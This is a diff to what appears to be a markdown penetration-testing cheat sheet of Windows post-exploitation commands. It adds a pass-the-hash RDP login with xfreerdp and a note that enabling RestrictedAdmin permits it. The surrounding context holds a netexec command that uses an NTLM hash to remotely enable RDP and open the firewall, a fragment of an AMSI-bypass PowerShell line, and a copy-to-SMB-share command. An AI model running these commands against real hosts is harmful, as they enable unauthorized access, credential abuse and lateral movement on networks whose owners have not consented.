@@ -52,7 +52,7 @@ $a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c
 - Copy files: `copy <FILENAME> \\192.168.45.223\share`
 
 ### <ins>Enable RDP and RestrictedAdmin from both Local/Remote</ins>:
-
+* Note: Enabling RestrictedAdmin allow us to perform PassTheHash with RDP.*
 Using command prompt: 
 
 ```
@@ -63,6 +63,9 @@ Using netexec:
 ```
 netexec smb db01 -u administrator -H faf3185b0a608ce2f8afb6f8d133f85b --local-auth -X 'reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f;reg add "hklm\system\currentcontrolset\control\terminal server" /f /v fDenyTSConnections /t REG_DWORD /d 0;netsh firewall set service remoteadmin enable;netsh firewall set service remotedesktop enable' --exec-method atexec
 ```
+
+RDP with hash:
+- `xfreerdp /v:172.16.231.221 /u:amit /pth:<NTLM HASH> +dynamic-resolution +clipboard`
 
 ### <ins>RDP to host</ins>:
 - `xfreerdp /v:172.16.231.221 /u:amit /p:'Password123!' +dynamic-resolution +clipboard`
